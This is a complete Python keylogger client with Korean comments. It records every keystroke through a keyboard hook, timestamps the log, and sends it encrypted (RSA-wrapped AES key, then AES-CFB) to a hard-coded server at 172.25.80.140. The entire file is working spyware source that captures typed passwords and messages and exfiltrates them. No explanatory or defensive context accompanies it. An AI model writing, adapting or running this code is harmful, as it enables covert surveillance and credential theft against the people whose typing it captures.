import socket
import time
import threading
from datetime import datetime
from queue import Queue
from pynput import keyboard
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

# 서버 정보
SERVER_IP = "172.25.80.140"
SERVER_PORT = 12345
BUFFER_SIZE = 1024

# AES 대칭키
aes_key = None

# 메모리 내 로그 저장용 큐
log_queue = Queue()

# AES 암호화 함수
def encrypt_message(message: bytes) -> bytes:
    iv = get_random_bytes(16)
    cipher = Cipher(algorithms.AES(aes_key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return iv + encryptor.update(message) + encryptor.finalize()

# 키보드 입력을 로그 큐에 기록하는 함수
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char is not None:
            log_queue.put(f"Key Pressed: {key.char}\n")
        else:
            log_queue.put(f"Special Key Pressed: {key}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# 5초마다 로그 큐에 시간을 기록하는 함수
def periodic_time_update():
    while True:
        time.sleep(5)
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_queue.put(f"\n--- Log Update at {current_time} ---\n")

# 서버로 로그 데이터를 전송하는 함수
def send_log_to_server():
    global aes_key
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
            client_socket.connect((SERVER_IP, SERVER_PORT))

            # 서버로부터 RSA 공개키 수신
            public_key_data = client_socket.recv(450)
            server_public_key = RSA.import_key(public_key_data)

            # AES 대칭키 생성 및 RSA 암호화 후 전송
            aes_key = get_random_bytes(32)
            cipher_rsa = PKCS1_OAEP.new(server_public_key)
            encrypted_aes_key = cipher_rsa.encrypt(aes_key)
            client_socket.sendall(encrypted_aes_key)

            print("AES key securely sent to the server.")

            # 로그 데이터 전송
            while True:
                if not log_queue.empty():
                    # 로그 데이터를 큐에서 가져와 암호화하여 전송
                    logs_to_send = []
                    while not log_queue.empty():
                        logs_to_send.append(log_queue.get())

                    log_data = "".join(logs_to_send).encode("utf-8")
                    encrypted_data = encrypt_message(log_data)
                    client_socket.sendall(encrypted_data)
                    
                    print("Log data sent to server.")

                time.sleep(1)
    except Exception as e:
        print(f"Error sending data to server: {e}")

# 키보드 후킹 시작
def start_keyboard_hook():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    # 키 후킹 스레드 시작
    threading.Thread(target=start_keyboard_hook, daemon=True).start()

    # 시간 업데이트 스레드 시작
    threading.Thread(target=periodic_time_update, daemon=True).start()

    # 로그 전송 스레드 시작
    threading.Thread(target=send_log_to_server, daemon=True).start()

    # 메인 스레드 유지
    while True:
        time.sleep(1)
